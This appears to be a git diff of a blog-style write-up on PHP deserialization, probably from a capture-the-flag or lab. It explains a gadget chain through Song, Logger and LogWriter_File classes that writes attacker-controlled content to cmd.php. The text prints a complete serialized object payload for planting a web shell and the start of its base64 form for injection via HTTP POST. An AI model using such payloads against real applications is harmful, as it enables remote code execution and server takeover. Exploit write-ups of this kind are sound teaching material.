@@ -104,6 +104,7 @@ Let's continue on. In order to control the written filename, we need to identify
 LogWriter_File is the relevant class. In the class declaration, we can see that the `$filename` variable is set to our desired file name within the LogWriter_File constructor (refer to the 'LogWriter_File Declaration' picture).
 
 In the same image, we can also see that the content of the file is stored in the `$txt` parameter within the `writeLog` function of the LogWriter_File class.
+<br />
 The `$txt` content is controlled by executing the `log()` function within the Song class, which consists of a concatenation of the `name` and `group` properties of the Song class.
 
 To control both the filename and content of the file using the `file_put_contents` function, we need to follow the class calling orders and determine where and by whom the `writeLog` function is invoked.
@@ -128,12 +129,12 @@ To summarize what we’ve covered so far:
   <img src="{{ site.url }}/images/all_the_magic_happens.jpg" alt="all_the_magic_happens" />
 </p>
 
-Let's put all the pieces together to create the final payload as a one big serialized object:
+Let's put all the pieces together to create the payload as a one big serialized object:
 
 `O:6:"Lyrics":2:{s:9:"*lyrics";s:12:"shell_lyrics";s:7:"*song";O:4:"Song":4:{s:9:"*logger";O:6:"Logger":1:{s:12:"*logwriter";O:14:"LogWriter_File":2:{s:11:"*filename";s:7:"cmd.php";s:9:"*format";O:13:"LogFileFormat":2:{s:10:"*filters";a:1:{i:0;O:12:"OutputFilter":2:{s:15:"*matchPattern";s:19:"/\[i\](.*)\[\/i\]/i";s:14:"*replacement";s:9:"\1";}}s:7:"*endl";s:1:" ";}}}s:7:"*name";s:35:"";s:8:"*group";s:11:"shell_group";s:6:"*url";s:19:"https:\/\/shell.com";}}`
 
-<br /><br />
-The final serialized payload will be as follows, in base64 format:
+<br />
+The final serialized payload to be injected as a HTTP POST parameter in base64 format wil follow:
 
 `Tzo2OiJMeXJpY3MiOjI6e3M6OToiACoAbHlyaWNzIjtzOjEyOiJzaGVsbF9seXJpY3MiO3M6`
 <br />
